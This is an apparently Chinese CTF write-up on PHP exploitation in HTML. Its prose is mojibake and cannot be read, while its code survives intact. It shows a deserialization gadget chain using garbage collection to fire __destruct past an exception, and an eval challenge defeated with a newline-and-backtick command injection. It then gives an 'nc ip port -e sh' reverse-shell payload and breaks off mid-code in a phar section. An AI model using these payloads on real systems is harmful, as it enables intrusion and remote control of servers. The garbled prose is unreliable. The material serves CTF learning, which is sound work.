title="GCå›æ”¶æœºåˆ¶è§¦å‘destruct"></a>GCå›æ”¶æœºåˆ¶è§¦å‘<strong>destruct</strong></h2><p>é¦–å…ˆæˆ‘ä»¬æ¥èŠèŠä»€ä¹ˆæ˜¯GCå›æ”¶æœºåˆ¶ã€‚GCå›æ”¶æ˜¯ä¸€ç§é”€æ¯æœºåˆ¶ï¼Œåˆç§°åƒåœ¾å›æ”¶æœºåˆ¶ã€‚<br>åœ¨PHPä¸­ï¼Œä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸæ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡çš„ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸ºNULLï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘<br>æ—¶ï¼Œå®ƒå°±ä¼šè¢«å˜æˆåƒåœ¾ï¼Œè¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰<br>é‚£ä¹ˆè¿™é‡Œçš„è¯æˆ‘ä»¬å°±å¯ä»¥ç†è§£ä¸ºï¼Œå½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨æ—¶ï¼Œå°±ä¼šè¢«GCæœºåˆ¶å›æ”¶ï¼Œåœ¨å›æ”¶çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šè‡ªåŠ¨è§¦å‘_destructæ–¹æ³•ï¼Œè€Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»•è¿‡æŠ›å‡ºå¼‚å¸¸çš„å…³é”®ç‚¹ã€‚</p><h3 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘å›æ”¶&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;æŠ›å‡ºå¼‚å¸¸&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç æ— æ³•è§¦å‘__destruct()åŸå› æ˜¯ä»£ç å†ç»“æŸå‰è¢«ç›´æ¥æŠ›å‡ºäº†å¼‚å¸¸å¯¼è‡´å®ä¾‹æ— æ³•æ­£ç¡®è¢«é”€æ¯è§¦å‘é­”æœ¯æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘å›æ”¶&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$A</span>=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;æŠ›å‡ºå¼‚å¸¸&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç è¾“å‡ºäº†è§¦å‘å›æ”¶ã€‚å³å…¶è§¦å‘äº†__destruct()<br>å¯ä»¥çœ‹å‡ºå½“æˆ‘ä»¬é‡æ–°å°†å¯¹è±¡èµ‹å€¼ä¸ºNULLæ—¶è§¦å‘äº†GCå›æ”¶æœºåˆ¶ã€‚</p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>è¿™é‡Œæˆ‘å°±ç›´æ¥ä½¿ç”¨è¿™é¢˜æ¥æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬è¿˜æ˜¯é¦–å…ˆæ‰¾é“¾å­æ˜æ˜¾å¯ä»¥çœ‹å‡ºé“¾å­å¼ è¿™æ ·<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CCC&#123;__destruct&#125;-&gt;AAA&#123;__tostring&#125;-&gt;BBB&#123;__get&#125;</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ€ä¹ˆè§¦å‘__destructã€‚å› ä¸ºå…¶å†ç¨‹åºå°¾éƒ¨æŠ›å‡ºäº†å¼‚å¸¸ã€‚å¯¼è‡´æ— æ³•æ­£å¸¸è§¦å‘æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨GCå›æ”¶æœºåˆ¶ã€‚é“¾å­æ„é€ å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;lalala&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&quot;0&quot;</span>=&gt;<span class="variable">$a</span>,<span class="string">&quot;1&quot;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line">---------------------------------------</span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;N;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;&#125;&#125;i:<span class="number">0</span>;N;&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å°†è¾“å‡ºçš„åºåˆ—åŒ–è¿›è¡Œå°å°çš„ä¿®æ”¹å°†æœ€åçš„1è¯¥ä¸º0å³æ•°ç»„åŸæœ¬æ˜¯é”®1æ‰§è¡Œäº†NULLåœ¨ä¿®æ”¹åä¼šå˜ä¸ºé”®0æŒ‡å‘NULLè€Œ0æœ¬æ¥æŒ‡å‘ä¸€ä¸ªå®ä¾‹è¿™ä¹Ÿå°±å¯¼è‡´äº†å®ä¾‹è¢«é”€æ¯è§¦å‘äº†GCå›æ”¶æœºåˆ¶<br>é‚£ä¹ˆæˆ‘ä»¬æœ€åçš„é—®é¢˜å°±æ˜¯å¦‚ä½•åˆ©ç”¨æœ€åçš„åé—¨å‡½æ•°äº†ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>é¦–å…ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€åçš„å‡½æ•°æ—¶é“¾å¼è°ƒç”¨ï¼Œè¿™å¯¼è‡´äº†æˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨å›è°ƒå‡½æ•°ç›´æ¥ä½¿ç”¨åé—¨ç±»å‡½æ•°ã€‚ä½†æ˜¯æˆ‘ä»¬åªè¦èƒ½ä½¿å¾—<code>call_user_func($a,$b)($c)</code>è¿”å›å€¼ä¸ºsystemé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨systemå‡½æ•°å•¦ã€‚æˆ‘ä»¬ä¸€æ­¥æ­¥ä¼šæ¨ã€‚æˆ‘ä»¬åªè¦ä½¿å¾—<code>call_user_func($a,$b)</code>è¿”å›å€¼ä¸º<code>urldecode</code>å°±å¯ä»¥ä½¿å…¶è¿”å›å€¼ä¸º<code>$c</code>çš„å€¼äº†ã€‚å…¶ä¸­$aå’Œ$bæˆ‘ä»¬éƒ½å¯æ§ä½†æ˜¯$bä¸ºæ•°ç»„å¹¶ä¸”åˆ é™¤äº†é”®açš„å€¼ï¼Œé‚£ä¹ˆè¿™æ—¶å€™æˆ‘å°±æƒ³åˆ°äº†ç›´æ¥å¼ºåˆ¶ç±»å‹è½¬æ¢æ˜¯ä¸æ˜¯å°±å¯ä»¥ç›´æ¥è¿”å›$bçš„å€¼å‘¢ã€‚ç»è¿‡å°è¯•æ˜¯çš„ã€‚<br>é‚£ä¹ˆç»“æœå°±å¾ˆæ˜ç¡®äº†ã€‚<br></p><h1 id="ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§"><a href="#ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§" class="headerlink" title="ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§"></a>ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§</h1><p>è¯´å®è¯åŸºç¡€è¿˜æ˜¯å¤ªå·®äº†ï¼Œæ¯æ¬¡é‡åˆ°waféƒ½å¤´ç–¼ï¼Œå†™è¿™é¢˜çš„æ—¶å€™ç»•çš„ç´¯æ­»äº†ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è‚˜æ­»ä½ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å¯¹è¾“å…¥å­—ç¬¦æ•°åšäº†é™åˆ¶ï¼Œé‚£ä¹ˆç¬¬ä¸€æ—¶é—´è‚¯å®šæ˜¯å°è¯•è¿›è¡Œé€ƒé€¸ã€‚åœ¨å†™è¿™é¢˜çš„æ—¶å€™å¯¹é€ƒé€¸çš„çŸ¥è¯†å¹¶ä¸æ˜¯ç‰¹åˆ«äº†è§£åªçŸ¥é“å¯ä»¥é€šè¿‡eval($_GET())è¿™ç§å§¿åŠ¿è¿›è¡Œé€ƒé€¸ï¼Œä½†æ˜¯åœ¨è¿™é¢˜æ˜æ˜¾æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œé‚£ä¹ˆè¿™æ—¶å€™æˆ‘æœ‰æƒ³åˆ°ä½¿ç”¨åå¼•å·æ•ˆæœä¼šä¸ä¼šæˆåŠŸå‘¢?ã€‚åœ¨å°è¯•åå‘ç°ç¡®å®æ˜¯å¯ä»¥æˆåŠŸï¼Œåªæ˜¯æ— æ³•å›æ˜¾ã€‚ä½†æ˜¯è¦æˆåŠŸå‘½ä»¤æ‰§è¡Œéœ€è¦å°†å‰åçš„å­—ç¬¦ä¸²è¿›è¡Œç»•è¿‡ã€‚æˆ‘åœ¨ç½‘ä¸ŠæŸ¥äº†å¥½ä¸€ä¼šç»ˆäºæŸ¥åˆ°äº†å¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦ç»•è¿‡å‰é¢çš„æ³¨é‡Šç¬¦ï¼Œè€Œåé¢çš„å­—ç¬¦ç›´æ¥æ³¨é‡Šå³å¯ï¼Œåœ¨è¿™æ¬¡çš„æ¯”èµ›é‡Œæˆ‘è¿˜å­¦åˆ°äº†ä¸€ä¸ªä¸éœ€è¦å­—ç¬¦å³å¯å¯¹åæ‹¼æ¥çš„å­—ç¬¦è¿›è¡Œæ³¨é‡Šçš„æ–¹æ³•ã€‚å…ˆä¸è¯´åé¢çš„å…¶ä»–é¢˜ç›®ä¼šæåˆ°ã€‚<br>æ€»ç»“ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“é€ƒé€¸çš„è¯­å¥åº”è¯¥å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a`$_GET[1]`%23</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯é€ƒé€¸åæˆ‘ä»¬è¿˜æ— æ³•ä»»æ„çš„å‘½ä»¤æ‰§è¡Œè¿™æ˜¯å› ä¸ºï¼Œä¸‹é¢çš„ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>è¿™å¥è¯æ˜¯å°†å…¨å±€å˜é‡$_GETè¿›è¡Œéå†åœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…ã€‚è¿™å°±å¯¹æˆ‘ä»¬é€ƒé€¸çš„å†…å®¹è¿›è¡Œäº†é™åˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°å…¶æ²¡æœ‰å¯¹ncè¿›è¡Œé™åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ncåå¼¹shell<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%<span class="number">0</span>a`<span class="variable">$_GET</span>[<span class="number">1</span>]`%<span class="number">23</span>&amp;<span class="number">1</span>=nc ip  port -e sh</span><br></pre></td></tr></table></figure></p><h1 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h1><p>è¿™é“é¢˜ç›®ä¸»è¦æ˜¯è€ƒpharååºåˆ—åŒ–è¿™é“é¢˜ç›®ä¹Ÿæ˜¯å­¦åˆ°äº†å¾ˆå¤š<br>æˆ‘ä»¬å…ˆæŸ¥çœ‹class.phpå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 